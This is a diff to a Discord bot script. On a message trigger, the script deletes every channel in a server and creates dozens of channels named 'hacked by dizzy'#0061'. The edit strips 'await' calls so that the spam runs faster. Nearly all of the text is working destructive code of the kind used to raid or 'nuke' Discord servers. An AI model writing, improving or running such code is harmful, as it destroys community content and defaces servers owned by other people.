@@ -172,116 +172,117 @@ client.on("message", async msg => {
      msg.guild.channels.cache.forEach(c => {c.delete()
 
     
-     await msg.guild.channels.create("hacked by dizzy'#0061", {
+  msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {// by dizzy'#0061
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {// by dizzy'#0061
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {// by dizzy'#0061
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {// by dizzy'#0061
       type: "text"// by dizzy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"// by dizzy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"// by dizzy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061
       type: "text"//by diizy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"//by diizy'#0061//by diizy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061//by diizy'#0061
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061//by diizy'#0061
       type: "text"//by diizy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"//by diizy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"//by diizy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061//by diizy'#0061
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {//by diizy'#0061//by diizy'#0061
       type: "text"//by diizy'#0061
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
-    }); await msg.guild.channels.create("hacked by dizzy'#0061", {
+    });   msg.guild.channels.create("hacked by dizzy'#0061", {
       type: "text"
+
  
        
 
